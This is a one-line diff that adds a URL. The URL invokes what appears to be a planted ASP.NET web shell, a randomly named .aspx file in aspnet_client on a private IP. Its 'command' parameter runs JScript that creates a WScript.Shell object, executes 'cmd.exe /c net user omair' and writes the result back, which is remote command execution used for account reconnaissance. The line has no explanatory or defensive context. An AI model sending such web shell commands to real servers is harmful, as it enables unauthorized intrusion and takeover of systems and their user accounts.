@@ -1,0 +1,1 @@
+view-source:https://192.168.23.146/aspnet_client/CpGJCpqMPM.aspx?command=Response.Write(new%20ActiveXObject(%22WScript.Shell%22).Exec(%22cmd.exe%20/c%20net%20user%20omair%22).StdOut.ReadAll());
